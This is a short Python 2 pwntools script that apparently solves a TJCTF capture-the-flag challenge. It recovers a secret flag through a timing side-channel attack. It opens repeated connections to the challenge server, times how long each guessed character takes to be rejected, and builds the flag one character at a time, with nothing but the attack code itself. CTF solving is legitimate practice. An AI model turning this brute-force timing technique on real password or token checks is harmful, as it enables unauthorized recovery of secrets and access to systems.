import os
from pwn import *
from time import time
CHECKS='1000000'
steps=10

flag='TkV'

def readfrom(x):
	out=open(x).read().split(',')
	l=[]
	if len(out[0])==0:
		return l
	for O in out:
		l.append(float(O))
	return l

while(1):
	best,val=0,-1
	l=readfrom('output')
	for p in range(32+len(l),127):
		S=0
		print chr(p)
		for i in range(steps):
			s=remote('problem1.tjctf.org','8003')
			s.recvuntil('password?')
			s.sendline(CHECKS)
			s.recvuntil(':')
			x=time()
			s.sendline(flag+chr(p)+'\x00'*(499-len(flag)))
			s.recvuntil('failed!')
			y=time()
			S+=y-x
			s.close()
		S/=steps
		l.append(S)
		open('output','w').write(','.join(str(a) for a in l))
	l=[(l[i],chr(i+32)) for i in range(len(l))]
	print list(reversed(sorted(l)))
	flag+=list(reversed(sorted(l)))[0][1]
	open('output','w').write('')
	print flag
